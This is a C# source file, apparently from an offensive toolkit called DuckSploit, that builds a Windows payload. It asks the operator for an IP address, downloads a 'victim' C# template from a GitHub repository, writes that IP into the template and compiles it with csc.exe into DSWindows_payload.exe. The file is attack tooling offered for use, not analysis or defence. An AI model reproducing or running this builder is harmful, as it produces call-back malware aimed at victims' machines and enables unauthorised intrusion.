using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.IO.Compression;
using System.Web;
using System.Threading;
using System.Text.RegularExpressions;

namespace DScompiler
{
    class compiler
	{
		public static void execute_cmd(string cmd)
        {
            
			
			string callcommand = "/c " + cmd ;
			
			ProcessStartInfo processInfo;
			Process process;
			
			string output = "";
			
			processInfo = new ProcessStartInfo("cmd.exe", callcommand);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
        }
		public static void Download(string url, string outPath)
		{
			string tempdir = Path.GetTempPath();
			
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc00);
			
			new WebClient().DownloadFile(url, outPath);
		}
		public static void sendmsg(string message, string color)
		{
			if (color == "red")
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "green")
			{
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "yellow")
			{
				Console.ForegroundColor = ConsoleColor.Yellow;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "blue")
			{
				Console.ForegroundColor = ConsoleColor.Blue;
				Console.WriteLine(message);
				Console.ResetColor();
			}
		}
		public static void sendmsgnonewline(string message, string color)
		{
			if (color == "red")
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.Write(message);
				Console.ResetColor();
			}
			else if (color == "green")
			{
				Console.ForegroundColor = ConsoleColor.Green;
				Console.Write(message);
				Console.ResetColor();
			}
			else if (color == "yellow")
			{
				Console.ForegroundColor = ConsoleColor.Yellow;
				Console.Write(message);
				Console.ResetColor();
			}
			else if (color == "blue")
			{
				Console.ForegroundColor = ConsoleColor.Blue;
				Console.Write(message);
				Console.ResetColor();
			}
		}
		public void compile(string arch)
        {
			string userprofile = System.Environment.GetEnvironmentVariable("USERPROFILE");
			string tempdir = Path.GetTempPath(); 
			string dir = userprofile + "\\DuckSploit"; 
			
			if (arch == "win")
			{
				if (File.Exists(@"C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\csc.exe")) {
					sendmsg("[o] csc.exe v3.5 is installed", "yellow");
					Console.WriteLine(" ");
								
					sendmsgnonewline("Enter your ip (ipv4, ipv6 or dns server link allowed): ", "green");
					string myip = Console.ReadLine(); 
								
					sendmsg("Downloading executable...", "yellow");
					Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/victim/windows/program.cs", tempdir + "\\DSwindows.cs");
					sendmsg("Downloaded!", "yellow");
					
					string text = File.ReadAllText(tempdir + "\\DSwindows.cs");
					text = text.Replace("<yourip>", myip);
					File.WriteAllText(tempdir + "\\DSwindows.cs", text);
					Console.Clear();
					sendmsg("Loading...", "yellow");
								
					execute_cmd("mkdir " + dir + "\\generated");
					execute_cmd("call %windir%\\Microsoft.NET\\Framework\\v3.5\\csc.exe /out:" + dir + "\\generated\\DSWindows_payload.exe %temp%\\DSwindows.cs");
					Console.Clear();
								
					sendmsg("DS payload is now generated! ", "yellow");
					sendmsg("Can be found at: " + dir + "\\generated\\DSWindows_payload.exe", "yellow");
				}
				else
				{
					sendmsg("/!\\ MICROSOFT.NET version v3.5 isn't installed on your computer, please install it to build windows payload", "red");
				}
			}
			else if (arch == "lin")
			{
				Console.WriteLine("Not avaliable");
			}
		}
	}
}